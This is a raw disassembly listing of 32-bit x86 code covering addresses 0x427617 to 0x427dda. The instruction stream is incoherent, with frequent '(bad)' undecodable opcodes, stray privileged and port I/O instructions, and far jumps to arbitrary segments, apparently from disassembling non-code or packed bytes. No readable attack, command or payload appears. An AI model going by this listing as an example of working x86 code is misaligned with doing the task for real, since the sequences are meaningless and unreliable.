  427617:	das    
  427618:	(bad)  
  427619:	scas   eax,DWORD PTR es:[edi]
  42761a:	push   ebx
  42761b:	add    BYTE PTR [ebp+0x5],cl
  42761e:	pop    es
  42761f:	aam    0x78
  427621:	adc    edx,esi
  427623:	xor    al,0x60
  427625:	mov    al,0x52
  427627:	xor    BYTE PTR [edi-0x7f],dl
  42762a:	ins    DWORD PTR es:[edi],dx
  42762b:	cmp    bl,0x96
  42762e:	(bad)  
  42762f:	push   eax
  427630:	mov    ah,0xa6
  427632:	fsub   DWORD PTR [edx+0x18fd6756]
  427638:	(bad)  
  427639:	fstp   st(5)
  42763b:	enter  0x4c4e,0x42
  42763f:	adc    al,0x1a
  427641:	jbe    0x4275dc
  427643:	mov    eax,ds:0xf0441251
  427648:	pop    eax
  427649:	adc    al,0xed
  42764b:	push   eax
  42764c:	add    BYTE PTR [edx-0x30],cl
  42764f:	dec    esp
  427650:	jb     0x427670
  427652:	lods   al,BYTE PTR ds:[esi]
  427653:	mov    ds:0x5535d56a,eax
  427658:	push   es
  427659:	add    eax,0xec9c7600
  42765e:	sbb    edx,DWORD PTR ds:0x6203c20f
  427664:	fdivr  DWORD PTR [edi]
  427666:	faddp  st(4),st
  427668:	fmul   QWORD PTR [edx+0x51]
  42766b:	mov    al,ds:0xa7b0ba84
  427670:	cli    
  427671:	push   ds
  427672:	and    al,0x8b
  427674:	or     bl,bl
  427676:	pusha  
  427677:	pop    eax
  427678:	jo     0x427611
  42767a:	out    dx,eax
  42767b:	in     al,dx
  42767c:	push   cs
  42767d:	push   cs
  42767e:	ss push 0x2e
  427681:	push   ds
  427682:	cmp    eax,0x938fdad0
  427687:	cli    
  427688:	mov    esi,0x7a705d34
  42768d:	stc    
  42768e:	jl     0x4276ba
  427690:	call   0xfacf:0x58f0327d
  427697:	adc    BYTE PTR [ecx],cl
  427699:	or     dh,BYTE PTR [esi-0x24bf8723]
  42769f:	xor    al,0x1b
  4276a1:	cmp    ah,BYTE PTR [eax-0x65dd8dae]
  4276a7:	dec    ebp
  4276a8:	les    eax,FWORD PTR [edx-0x5db3b356]
  4276ae:	data16 in al,dx
  4276b0:	mov    dh,0x56
  4276b2:	shr    BYTE PTR [edx],1
  4276b4:	les    eax,FWORD PTR [ebx+0x56182b82]
  4276ba:	les    ebp,FWORD PTR [esi+0xa]
  4276bd:	std    
  4276be:	pop    edi
  4276bf:	push   ebp
  4276c0:	lds    eax,FWORD PTR [ecx-0xf1d892c]
  4276c6:	repz push edx
  4276c8:	or     al,BYTE PTR [edx-0x40]
  4276cb:	mov    ah,BYTE PTR [ebx]
  4276cd:	arpl   WORD PTR [ebx],sp
  4276cf:	pop    esp
  4276d0:	les    esi,FWORD PTR [ecx]
  4276d2:	hlt    
  4276d3:	jae    0x42773e
  4276d5:	stos   BYTE PTR es:[edi],al
  4276d6:	push   ebp
  4276d7:	and    BYTE PTR [esi],0x76
  4276da:	add    al,0x45
  4276dc:	cmp    BYTE PTR ds:0xa07d65ca,0x3a
  4276e3:	sbb    dh,BYTE PTR [edx]
  4276e5:	popa   
  4276e6:	sbb    bl,cl
  4276e8:	inc    esi
  4276e9:	mov    eax,ds:0xd4568aba
  4276ee:	lods   al,BYTE PTR ds:[esi]
  4276ef:	cmp    dl,BYTE PTR [eax+0x32a42e22]
  4276f5:	push   ecx
  4276f6:	mov    dl,0x29
  4276f8:	out    dx,al
  4276f9:	mov    ds:0xc6ac41a9,al
  4276fe:	sub    ch,BYTE PTR [esi+0x50]
  427701:	add    al,0xb8
  427703:	mov    al,ds:0xc2065548
  427708:	ss sahf 
  42770a:	in     al,dx
  42770b:	jg     0x4276d4
  42770d:	rol    BYTE PTR [edx+0x48973467],0x2c
  427714:	scas   eax,DWORD PTR es:[edi]
  427715:	in     al,dx
  427716:	push   ebp
  427717:	pop    esp
  427718:	push   edx
  427719:	das    
  42771a:	adc    ebp,0x3a28f840
  427720:	test   BYTE PTR [ebp+eax*2+0x53],ch
  427724:	leave  
  427725:	mov    edx,0xc7d06f4c
  42772a:	jl     0x427726
  42772c:	iret   
  42772d:	inc    esi
  42772e:	or     DWORD PTR [edx],0x65de7ca2
  427734:	mov    eax,0xe04e675
  427739:	(bad)  
  42773a:	call   0xa042eb35
  42773f:	(bad)  
  427740:	aam    0x86
  427742:	mov    ds:0x985b9252,al
  427747:	lock cli 
  427749:	jp     0x427744
  42774b:	test   DWORD PTR [ebp+0x4b],edx
  42774e:	inc    ebp
  42774f:	xor    dl,BYTE PTR [esi-0x11cba160]
  427755:	jmp    0x984c:0xbd61bc2c
  42775c:	icebp  
  42775d:	add    BYTE PTR [edx-0x25c5ffe5],al
  427763:	mov    ds:0x74f2926e,al
  427768:	dec    BYTE PTR [ebx+0x163089be]
  42776e:	mov    eax,ds:0x8a39aaab
  427773:	cmp    al,BYTE PTR [edx-0x10]
  427776:	push   0x14
  427778:	push   ebx
  427779:	dec    ebp
  42777a:	mov    dh,0x55
  42777c:	mov    esp,0x7b23fe
  427781:	pop    edi
  427782:	cmp    cl,bl
  427784:	hlt    
  427785:	inc    esi
  427786:	mov    esi,0x4d500464
  42778b:	in     al,dx
  42778c:	adc    BYTE PTR [ecx-0xe],cl
  42778f:	shr    BYTE PTR [edi+ebp*1],cl
  427792:	inc    BYTE PTR [esi-0x5699044a]
  427798:	stos   DWORD PTR es:[edi],eax
  427799:	fwait
  42779a:	aas    
  42779b:	cmp    DWORD PTR [ebx+ebx*2],eax
  42779e:	loopne 0x42780a
  4277a0:	add    bh,ah
  4277a2:	jae    0x4277a4
  4277a4:	mov    dh,0x95
  4277a6:	enter  0x360a,0x6b
  4277aa:	jecxz  0x42781c
  4277ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4277ad:	mov    eax,ds:0x4c915abf
  4277b2:	test   al,0x56
  4277b4:	or     DWORD PTR [eax+0x3adb7ac8],esi
  4277ba:	in     al,0x2a
  4277bc:	es scas al,BYTE PTR es:[edi]
  4277be:	cmp    ch,BYTE PTR [edx]
  4277c0:	push   ss
  4277c1:	xor    al,0xe
  4277c3:	out    0x54,al
  4277c5:	nop
  4277c6:	push   edi
  4277c7:	sbb    al,0xc3
  4277c9:	in     al,0x6b
  4277cb:	sbb    esi,DWORD PTR [esi]
  4277cd:	je     0x4277d8
  4277cf:	and    al,0xec
  4277d1:	dec    ebp
  4277d2:	push   cs
  4277d3:	jbe    0x42781e
  4277d5:	push   eax
  4277d6:	xchg   DWORD PTR [eax],eax
  4277d8:	push   0xcb9ad80f
  4277dd:	rcr    DWORD PTR [edx+ebp*8],0xa2
  4277e1:	and    al,0xfb
  4277e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4277e4:	dec    ecx
  4277e5:	(bad)
  4277e8:	sub    dl,BYTE PTR [edx]
  4277ea:	test   esi,esp
  4277ec:	xor    al,0x5e
  4277ee:	add    BYTE PTR [edx+0x43],bh
  4277f1:	add    al,dl
  4277f3:	add    ecx,edx
  4277f5:	pop    esi
  4277f6:	sub    ebp,DWORD PTR [eax-0x7c]
  4277f9:	dec    esp
  4277fa:	iret   
  4277fb:	sbb    al,0x70
  4277fd:	sbb    BYTE PTR [edx],bh
  4277ff:	xor    al,0x5b
  427801:	stos   DWORD PTR es:[edi],eax
  427802:	cs jp  0x4277e4
  427805:	add    BYTE PTR [edi],cl
  427807:	mov    ebx,0x2800c5fe
  42780c:	pusha  
  42780d:	jns    0x4277a8
  42780f:	loope  0x42782e
  427811:	lods   eax,DWORD PTR ds:[esi]
  427812:	call   0x8a86bad1
  427817:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427818:	mov    BYTE PTR [eax],al
  42781a:	xchg   ebx,eax
  42781b:	bound  eax,QWORD PTR [eax]
  42781d:	daa    
  42781e:	pop    edx
  42781f:	mov    bl,0x55
  427821:	mov    dh,0x26
  427823:	fs xor eax,0xf43024b2
  427829:	dec    esp
  42782a:	xchg   esp,eax
  42782b:	repz push ss
  42782d:	xchg   ebp,eax
  42782e:	out    dx,al
  42782f:	in     eax,dx
  427830:	or     ecx,DWORD PTR [edx+0x2136cdfe]
  427836:	out    0x0,eax
  427838:	xchg   bl,bl
  42783a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42783b:	add    BYTE PTR ds:[ebx-0x2fb49a51],bh
  427842:	jbe    0x4277f9
  427844:	push   ebx
  427845:	adc    BYTE PTR [edi-0x20],bl
  427848:	leavew 
  42784a:	sbb    al,0xb
  42784c:	nop
  42784d:	lods   eax,DWORD PTR ds:[esi]
  42784e:	add    BYTE PTR [esi+0x4e5b56a0],dh
  427854:	ins    BYTE PTR es:[edi],dx
  427855:	(bad)  
  427856:	push   edx
  427857:	call   0x32d8f3e
  42785c:	fist   DWORD PTR [edx+ebp*2]
  42785f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427860:	mov    ds:0x52a6ca2e,eax
  427865:	lods   al,BYTE PTR ds:[esi]
  427866:	in     al,0x84
  427868:	mov    cs,WORD PTR [esi]
  42786a:	ret    
  42786b:	mov    esp,esp
  42786d:	xor    al,BYTE PTR [edi+eiz*2-0x324d2b16]
  427874:	push   ss
  427875:	cdq    
  427876:	mov    esp,0x7016f102
  42787b:	and    cl,BYTE PTR ds:0xbb5ca67
  427881:	mov    ds:0x4547c88,al
  427886:	cmp    ecx,DWORD PTR [esi+0x11c5419e]
  42788c:	mov    ch,0x2e
  42788e:	jns    0x42786a
  427890:	push   edx
  427891:	xor    cl,dl
  427893:	js     0x4278f5
  427895:	fadd   QWORD PTR [eax+0x41]
  427898:	inc    ebp
  427899:	lds    ebx,FWORD PTR [eax+0x15]
  42789c:	push   esp
  42789d:	mov    ch,0x32
  42789f:	push   eax
  4278a0:	fs sub bl,al
  4278a3:	push   ss
  4278a4:	xor    al,0xb5
  4278a6:	or     al,0xc8
  4278a8:	call   0x56aa:0x86a610c2
  4278af:	xabort 0x9a
  4278b2:	push   ebp
  4278b3:	dec    esi
  4278b4:	dec    edi
  4278b5:	sbb    ch,BYTE PTR [eax+0x28]
  4278b8:	mov    al,ds:0x1482c335
  4278bd:	and    al,0x6f
  4278bf:	sahf   
  4278c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4278c1:	mov    dl,0xb0
  4278c3:	out    dx,al
  4278c4:	lahf   
  4278c5:	push   ebp
  4278c6:	push   0xffffffa3
  4278c8:	mov    ds:0x5190a85a,eax
  4278cd:	push   es
  4278ce:	not    BYTE PTR [eax+0x2b]
  4278d1:	sub    BYTE PTR [edx-0x4b],dh
  4278d4:	fcomp  st(4)
  4278d6:	sbb    al,0x8
  4278d8:	inc    esp
  4278d9:	out    dx,al
  4278da:	js     0x4278a5
  4278dc:	(bad)  
  4278dd:	push   eax
  4278de:	inc    edi
  4278df:	push   ebx
  4278e0:	inc    ecx
  4278e1:	dec    esp
  4278e2:	push   esp
  4278e3:	ror    BYTE PTR [ecx+edi*1-0x22],0x47
  4278e8:	inc    esi
  4278e9:	and    DWORD PTR [ecx-0x73a98540],0xfffffff2
  4278f0:	sbb    DWORD PTR [edx],eax
  4278f2:	fld    TBYTE PTR [edx]
  4278f4:	dec    esp
  4278f5:	lock sub BYTE PTR [edi],dh
  4278f8:	mov    cs,ebp
  4278fa:	mov    ah,0x7c
  4278fc:	in     al,0x86
  4278fe:	mov    fs,WORD PTR [edx-0x3803b172]
  427904:	push   cs
  427905:	iret   
  427906:	mov    bh,BYTE PTR [esi+eiz*1-0xeaeafb0]
  42790d:	cmc    
  42790e:	out    dx,al
  42790f:	add    ch,dl
  427911:	sub    BYTE PTR [ebp-0x51e17afc],ah
  427917:	and    cl,BYTE PTR [ecx-0x72]
  42791a:	(bad)  
  42791b:	aam    0xd1
  42791d:	jo     0x42790e
  42791f:	test   al,0x6
  427921:	stos   BYTE PTR es:[edi],al
  427922:	or     cl,al
  427924:	and    BYTE PTR [eax+0x4e],0x1e
  427928:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427929:	ins    BYTE PTR es:[edi],dx
  42792a:	mov    ah,0xd8
  42792c:	popf   
  42792d:	call   0x796b002a
  427932:	jle    0x42793c
  427934:	push   cs
  427935:	pop    ds
  427936:	mov    dh,0x37
  427938:	(bad)  [eax-0x30]
  42793b:	enter  0x1527,0xe8
  42793f:	inc    eax
  427940:	inc    esp
  427941:	and    al,BYTE PTR [eax]
  427943:	sbb    esp,0x18864221
  427949:	mov    eax,0x743e0c30
  42794e:	gs cmp al,0x43
  427951:	dec    ebp
  427952:	pushf  
  427953:	pushf  
  427954:	push   esp
  427955:	mov    esp,0x48b115ea
  42795a:	aam    0x44
  42795c:	not    BYTE PTR [ecx]
  42795e:	jmp    0x6949:0x8294d7eb
  427965:	nop
  427966:	out    dx,al
  427967:	pushf  
  427968:	rcl    ecx,1
  42796a:	stos   BYTE PTR es:[edi],al
  42796b:	mov    ah,BYTE PTR [esp+eiz*8+0x464c121e]
  427972:	sar    BYTE PTR [ebp+0x36],cl
  427975:	push   ds
  427976:	rcl    BYTE PTR [esi-0xc],cl
  427979:	sub    al,0x1c
  42797b:	outs   dx,BYTE PTR ds:[esi]
  42797c:	and    BYTE PTR [edx+0x28088142],ah
  427982:	xchg   BYTE PTR [eax-0x3c],al
  427985:	pushf  
  427986:	call   0x2ab0:0x84aa2b6a
  42798d:	xor    DWORD PTR [eax],ebp
  42798f:	xchg   edi,eax
  427990:	dec    esp
  427991:	call   0x18a4:0xd80e30d6
  427998:	push   edx
  427999:	adc    BYTE PTR [edx],al
  42799b:	neg    BYTE PTR [edx]
  42799d:	dec    esp
  42799e:	inc    esi
  42799f:	imul   ebx,DWORD PTR [eax+esi*8],0x4c
  4279a3:	cmp    BYTE PTR [eax+0xa1b3c1a],dl
  4279a9:	cmp    bh,BYTE PTR [edx]
  4279ab:	push   ds
  4279ac:	dec    edi
  4279ad:	dec    esi
  4279ae:	xchg   ebx,eax
  4279af:	pusha  
  4279b0:	inc    ecx
  4279b1:	push   eax
  4279b2:	push   ebp
  4279b3:	dec    ebp
  4279b4:	sbb    eax,0xe60d5d
  4279b9:	inc    ebx
  4279ba:	stos   DWORD PTR es:[edi],eax
  4279bb:	pop    esp
  4279bc:	and    al,dl
  4279be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4279bf:	push   ds
  4279c0:	test   BYTE PTR [edx-0x7f],ah
  4279c3:	adc    ebp,DWORD PTR [edx-0x78]
  4279c6:	sbb    BYTE PTR [eax-0x5e],ch
  4279c9:	loopne 0x427966
  4279cb:	pop    ebp
  4279cc:	xchg   edx,eax
  4279cd:	jge    0x427952
  4279cf:	loop   0x427975
  4279d1:	sbb    eax,0xa40c00ea
  4279d6:	call   0x165c93e3
  4279db:	sbb    BYTE PTR [ecx-0x4e],ah
  4279de:	push   0x48
  4279e0:	jg     0x4279e5
  4279e2:	ds dec eax
  4279e4:	dec    ebp
  4279e5:	or     eax,0xbe9a99ad
  4279ea:	pop    esp
  4279eb:	or     cl,BYTE PTR [esi+0x50]
  4279ee:	jge    0x427978
  4279f0:	xor    al,BYTE PTR [eax+0x3b9ac8ad]
  4279f6:	aam    0x2e
  4279f8:	pop    esp
  4279f9:	mov    ecx,DWORD PTR [eax-0x2b5ef8ad]
  4279ff:	mov    esi,0xed54b840
  427a04:	mov    dh,0x0
  427a06:	adc    esi,DWORD PTR [ebx-0x2a9b3d6c]
  427a0c:	rcr    BYTE PTR [esi+eax*8-0x13],1
  427a10:	call   0x2ec0:0x69c2fcdc
  427a17:	add    eax,0x247b92d0
  427a1c:	into   
  427a1d:	push   eax
  427a1e:	mov    ds:0x47155d82,al
  427a23:	xchg   esp,eax
  427a24:	fcmovne st,st(2)
  427a26:	shl    DWORD PTR [ebp+edx*4-0x7f],1
  427a2a:	xor    BYTE PTR [esp+ebp*4],cl
  427a2d:	push   0xb8a52c5d
  427a32:	jmp    0x6286:0x8299cdac
  427a39:	push   0x26f5b826
  427a3e:	stos   BYTE PTR es:[edi],al
  427a3f:	cld    
  427a40:	mov    ah,0xa6
  427a42:	add    BYTE PTR [edx+0x78177ec0],0x46
  427a49:	xor    al,0x43
  427a4b:	add    al,0x91
  427a4d:	dec    ebp
  427a4e:	lods   eax,DWORD PTR ds:[esi]
  427a4f:	inc    ecx
  427a50:	dec    esp
  427a51:	mov    ds:0x545e8f08,al
  427a56:	xchg   esp,eax
  427a57:	push   ds
  427a58:	shl    BYTE PTR [edi],1
  427a5a:	ins    BYTE PTR es:[edi],dx
  427a5b:	mov    gs,WORD PTR [esi]
  427a5d:	add    BYTE PTR [esi],dl
  427a5f:	call   0xdd73d152
  427a64:	aam    0x70
  427a66:	inc    ebx
  427a67:	xchg   edi,eax
  427a68:	push   esp
  427a69:	sub    DWORD PTR [eax],0xffffffda
  427a6c:	mov    esp,DWORD PTR [edx-0x389954f2]
  427a72:	xor    edi,DWORD PTR [edi]
  427a74:	push   esi
  427a75:	enter  0x828a,0x4d
  427a79:	and    ah,BYTE PTR [edi]
  427a7b:	mov    eax,ds:0xc4ecd466
  427a80:	cwde   
  427a81:	sbb    eax,0xa70c5568
  427a87:	les    eax,FWORD PTR [esi]
  427a89:	(bad)  
  427a8a:	in     al,0x2a
  427a8c:	cmp    bl,BYTE PTR [edx+0x55]
  427a8f:	adc    DWORD PTR [edx-0x5],eax
  427a92:	call   0x389:0x5e035a40
  427a99:	test   eax,0x80ad688b
  427a9e:	dec    edi
  427a9f:	pop    edx
  427aa0:	or     ecx,DWORD PTR [ecx+eax*8-0x7a]
  427aa4:	fisubr WORD PTR [edx+esi*2]
  427aa7:	mov    ds:0xe67e6015,al
  427aad:	ja     0x427ac7
  427aaf:	pop    esi
  427ab0:	adc    ch,BYTE PTR [edx+0x725c5375]
  427ab6:	sub    al,0xa
  427ab8:	add    ch,bl
  427aba:	mov    es,WORD PTR [edx-0x42833d76]
  427ac0:	pusha  
  427ac1:	or     DWORD PTR [ebp+eax*1-0x34],edx
  427ac5:	retf   
  427ac6:	unpckhps xmm0,XMMWORD PTR es:[edx+0xd]
  427acb:	in     al,dx
  427acc:	or     dh,0x54
  427acf:	shl    BYTE PTR [eax+0x4286894d],cl
  427ad5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427ad6:	aas    
  427ad7:	jmp    0x50b3:0x580fb0c4
  427ade:	jo     0x427aec
  427ae0:	loope  0x427b3c
  427ae2:	aaa    
  427ae3:	mov    edx,0xb476bedb
  427ae8:	mov    es,WORD PTR [edx]
  427aea:	hlt    
  427aeb:	sub    eax,0x7228490c
  427af0:	data16 sbb bl,BYTE PTR [edx-0x54]
  427af4:	cmp    BYTE PTR [edx+0x6],0xfa
  427af8:	mov    esp,DWORD PTR [esp+0x6ae054a0]
  427aff:	mov    ecx,DWORD PTR [eax]
  427b01:	inc    esi
  427b02:	aam    0x94
  427b04:	repnz inc esp
  427b06:	push   esp
  427b07:	stos   DWORD PTR es:[edi],eax
  427b08:	int    0xb
  427b0a:	push   eax
  427b0b:	aam    0xbe
  427b0d:	data16 xchg BYTE PTR [edx],dl
  427b10:	or     bh,BYTE PTR [esi-0x4ba2ff12]
  427b16:	mov    al,ds:0x2be1a0ad
  427b1b:	add    BYTE PTR [esi+0x1cfc2550],cl
  427b21:	cmp    bl,dl
  427b23:	loop   0x427b4f
  427b25:	mov    bh,0xda
  427b27:	jb     0x70436529
  427b2d:	call   0x45de81dc
  427b32:	or     bh,0xc4
  427b35:	das    
  427b36:	aas    
  427b37:	jp     0x427ad2
  427b39:	sub    bh,BYTE PTR [esi+0x68]
  427b3c:	push   es
  427b3d:	test   eax,0x400b7548
  427b42:	in     al,dx
  427b43:	sub    dl,bl
  427b45:	ins    BYTE PTR es:[edi],dx
  427b46:	inc    ebp
  427b47:	adc    ebx,DWORD PTR [esi+0x5116e776]
  427b4d:	dec    ebx
  427b4e:	mov    eax,0x150dc1e8
  427b53:	mov    ds:0x19764f8a,al
  427b58:	shl    BYTE PTR [esi-0x788307af],1
  427b5e:	mov    ah,0xf6
  427b60:	sub    BYTE PTR [eax+ebp*1+0x1],ch
  427b64:	int3   
  427b65:	xchg   esp,eax
  427b66:	or     eax,0x11ac939a
  427b6b:	aam    0x16
  427b6d:	shl    BYTE PTR [esi+0x72],0x97
  427b71:	jns    0x427ba1
  427b73:	cs fwait
  427b75:	add    DWORD PTR [esi+0x4],0xffffffa0
  427b79:	stos   BYTE PTR es:[edi],al
  427b7a:	inc    eax
  427b7b:	push   ecx
  427b7c:	loopne 0x427b0b
  427b7e:	lods   al,BYTE PTR ds:[esi]
  427b7f:	scas   al,BYTE PTR es:[edi]
  427b80:	mov    ds:0x15452112,eax
  427b85:	dec    ebp
  427b86:	mov    dh,0xea
  427b88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427b89:	mov    eax,ds:0xd6abe8e8
  427b8e:	sub    esp,ebp
  427b90:	scas   eax,DWORD PTR es:[edi]
  427b91:	xor    eax,0x7c158698
  427b96:	sub    eax,0xbc97aa02
  427b9b:	mov    bh,0xaa
  427b9d:	shl    BYTE PTR [ecx-0x7fca055f],0xbb
  427ba4:	repz pop edx
  427ba6:	js     0x427b67
  427ba8:	aad    0xf0
  427baa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427bab:	sub    ch,BYTE PTR [edx+edi*2]
  427bae:	(bad)  
  427baf:	inc    ecx
  427bb0:	mov    edi,es
  427bb2:	push   esi
  427bb3:	push   ecx
  427bb4:	and    dl,bl
  427bb6:	push   cs
  427bb7:	inc    ebp
  427bb8:	scas   al,BYTE PTR es:[edi]
  427bb9:	adc    al,0x5a
  427bbb:	dec    ecx
  427bbc:	mov    al,ds:0x550558ce
  427bc1:	(bad)  
  427bc2:	fiadd  DWORD PTR [edx+0x22c71652]
  427bc8:	pop    eax
  427bc9:	cs lock pop ecx
  427bcc:	fcom   st(3)
  427bce:	inc    esp
  427bcf:	repz pop ebp
  427bd1:	or     eax,0xdfc85dc2
  427bd6:	in     eax,dx
  427bd7:	add    BYTE PTR [ebp+0x6a],bl
  427bda:	iret   
  427bdb:	pop    edx
  427bdc:	xchg   ecx,eax
  427bdd:	adc    eax,DWORD PTR [edi+0x4a]
  427be0:	jge    0x427be4
  427be2:	out    0x27,al
  427be4:	xor    al,0xfb
  427be6:	xchg   BYTE PTR [esi+0xb],ah
  427be9:	sub    al,BYTE PTR [esi+0x7a]
  427bec:	ins    BYTE PTR es:[edi],dx
  427bed:	fsub   QWORD PTR [ebp+0x508dbef4]
  427bf3:	adc    eax,0x54891a1d
  427bf8:	dec    esi
  427bf9:	dec    esi
  427bfa:	mov    ebp,0x821e524d
  427bff:	push   esi
  427c00:	jp     0x427b8e
  427c02:	cmp    DWORD PTR [esi+0x78],esi
  427c05:	enter  0xbb6c,0xd4
  427c09:	push   0x28d10045
  427c0e:	bound  esp,QWORD PTR [edx+eax*8-0x2938778d]
  427c15:	call   0x841c:0xd3822200
  427c1c:	mov    al,ds:0x169619f3
  427c21:	mov    eax,0x6ade5816
  427c26:	scas   al,BYTE PTR es:[edi]
  427c27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427c28:	xchg   ecx,eax
  427c29:	mov    dh,0xea
  427c2b:	cmp    esi,0xffffff81
  427c2e:	int    0x76
  427c30:	sbb    DWORD PTR [eax-0x50],edx
  427c33:	lods   eax,DWORD PTR ds:[esi]
  427c34:	into   
  427c35:	jl     0x427bbf
  427c37:	pop    ecx
  427c38:	lahf   
  427c39:	mov    BYTE PTR [esi+0x3c6caed6],0x2e
  427c40:	mov    ds:0x729247be,al
  427c45:	adc    ebx,DWORD PTR [ebp-0x7e]
  427c48:	sbb    eax,0x54e2a287
  427c4d:	call   0x4cd0:0x16ec2afa
  427c54:	aas    
  427c55:	mov    al,ds:0xa36edc26
  427c5a:	out    dx,al
  427c5b:	fs fwait
  427c5d:	ret    
  427c5e:	or     BYTE PTR [esi],0x5b
  427c61:	push   es
  427c62:	retf   0x94c7
  427c65:	inc    edx
  427c66:	cld    
  427c67:	jb     0x427cd6
  427c69:	mov    al,ds:0x5474340e
  427c6e:	pop    eax
  427c6f:	imul   DWORD PTR [edx+0x52]
  427c72:	popa   
  427c73:	add    BYTE PTR ds:0xa13937e0,ch
  427c79:	aaa    
  427c7a:	adc    eax,0xef8257fc
  427c7f:	call   0x8ab72584
  427c84:	inc    ebp
  427c85:	or     eax,0x31ece46e
  427c8a:	xor    dl,al
  427c8c:	cmc    
  427c8d:	rcl    BYTE PTR [eax+0x14],1
  427c90:	adc    DWORD PTR ds:0xb9bcba6a,edx
  427c96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427c97:	pop    edx
  427c98:	hlt    
  427c99:	dec    eax
  427c9a:	lods   eax,DWORD PTR ds:[esi]
  427c9b:	mov    ?,WORD PTR [ebp-0x60]
  427c9e:	push   eax
  427c9f:	(bad)  [eax-0x564e4385]
  427ca5:	loope  0x427cc2
  427ca7:	pop    esi
  427ca8:	adc    esi,DWORD PTR [ecx+edx*4-0x42]
  427cac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427cad:	fisttp DWORD PTR [ecx]
  427caf:	or     esp,DWORD PTR [ecx-0x15]
  427cb2:	std    
  427cb3:	inc    esi
  427cb4:	mov    al,ds:0xb4b620fb
  427cb9:	stos   BYTE PTR es:[edi],al
  427cba:	mov    ds:0x466bb475,al
  427cbf:	aaa    
  427cc0:	jl     0x427c80
  427cc2:	mov    edx,0xeaaa2f85
  427cc7:	mov    al,0x56
  427cc9:	repnz adc al,0x4c
  427ccc:	xor    eax,0xc684c016
  427cd1:	sub    al,0x76
  427cd3:	xor    eax,0x3366a86f
  427cd8:	ficomp DWORD PTR ds:0x5aba000b
  427cde:	mov    al,0x6d
  427ce0:	imul   BYTE PTR [ecx-0x33eb4570]
  427ce6:	pop    ebx
  427ce7:	lock jne 0x427d07
  427cea:	sbb    al,al
  427cec:	and    edi,DWORD PTR [ebp+ebx*2-0x59f1e9e7]
  427cf3:	jbe    0x427ca1
  427cf5:	lods   eax,DWORD PTR ds:[esi]
  427cf6:	out    dx,al
  427cf7:	popa   
  427cf8:	sbb    al,0xda
  427cfa:	cmp    al,0x66
  427cfc:	leave  
  427cfd:	hlt    
  427cfe:	mov    eax,ds:0xd34c2a64
  427d03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427d04:	aad    0x4c
  427d06:	(bad)  
  427d07:	push   edx
  427d08:	lods   al,BYTE PTR ds:[esi]
  427d09:	call   0xb8791a90
  427d0e:	push   eax
  427d0f:	aam    0x2e
  427d11:	mov    esp,esi
  427d13:	sahf   
  427d14:	ins    BYTE PTR es:[edi],dx
  427d15:	sbb    BYTE PTR [eax-0x219595f4],0xd0
  427d1c:	call   0xcd2b:0xbd445c
  427d23:	ins    DWORD PTR es:[edi],dx
  427d24:	jl     0x427d90
  427d26:	mov    cl,0x51
  427d28:	cmc    
  427d29:	inc    ecx
  427d2a:	mov    esp,0x7e0c3717
  427d2f:	sahf   
  427d30:	jmp    0x427d0a
  427d32:	push   0xc05aa1c7
  427d37:	pop    ss
  427d38:	aad    0x80
  427d3a:	cmp    BYTE PTR [edx-0x2d],bl
  427d3d:	push   0x20
  427d3f:	rol    BYTE PTR [edx],0x57
  427d42:	ret    
  427d43:	push   0xd0e06536
  427d48:	shl    BYTE PTR [esi-0x7579271a],1
  427d4e:	mov    DWORD PTR [esi+0x52],esp
  427d51:	in     al,dx
  427d52:	jo     0x427db9
  427d54:	sub    al,0xa
  427d56:	mov    ah,0x88
  427d58:	inc    ebp
  427d59:	push   esi
  427d5a:	push   ecx
  427d5b:	pop    edx
  427d5c:	sub    BYTE PTR [edx-0x50],dl
  427d5f:	mov    eax,0x55033cf8
  427d64:	shl    DWORD PTR [eax+0x2f],1
  427d67:	push   0xffffffd6
  427d69:	out    dx,eax
  427d6a:	jbe    0x427de0
  427d6c:	sbb    edx,esp
  427d6e:	dec    ebx
  427d6f:	mov    bl,dl
  427d71:	mov    ss,esi
  427d73:	xor    bh,BYTE PTR [edx]
  427d75:	push   edx
  427d76:	mov    eax,ds:0xa69214c6
  427d7b:	mov    dl,0xb0
  427d7d:	mov    eax,ds:0x680ae015
  427d82:	inc    esp
  427d83:	stos   BYTE PTR es:[edi],al
  427d84:	add    ebp,DWORD PTR [ecx+edi*8+0x76325418]
  427d8b:	es cmp ebx,eax
  427d8e:	mov    dl,0x1d
  427d91:	adc    eax,0x586e36d6
  427d96:	add    eax,0x164654b8
  427d9b:	fidivr WORD PTR [esi+ebp*4]
  427d9e:	and    ebx,DWORD PTR [edx]
  427da0:	push   ss
  427da1:	dec    ebp
  427da2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427da3:	dec    esi
  427da4:	cmp    ch,BYTE PTR [eax+0x42]
  427da7:	add    al,0x11
  427da9:	push   ss
  427daa:	mov    BYTE PTR [esi],dh
  427dac:	mov    gs,WORD PTR [edi+0x10ce0c9]
  427db2:	cdq    
  427db3:	scas   al,BYTE PTR es:[edi]
  427db4:	cs and eax,0x889cdb60
  427dba:	inc    esi
  427dbb:	rcr    esp,1
  427dbd:	pop    eax
  427dbe:	add    bl,BYTE PTR ds:0x28c69f0d
  427dc4:	add    DWORD PTR [esi+0x69e4a20],ebp
  427dca:	hlt    
  427dcb:	das    
  427dcc:	stos   BYTE PTR es:[edi],al
  427dcd:	mov    dl,0xae
  427dcf:	loope  0x427e4b
  427dd1:	int3   
  427dd2:	cmp    dl,dl
  427dd4:	out    0x86,al
  427dd6:	ins    DWORD PTR es:[edi],dx
  427dd7:	or     DWORD PTR [eax],eax
  427dd9:	xchg   esi,eax
  427dda:	adc    eax,0x6f82e1b6
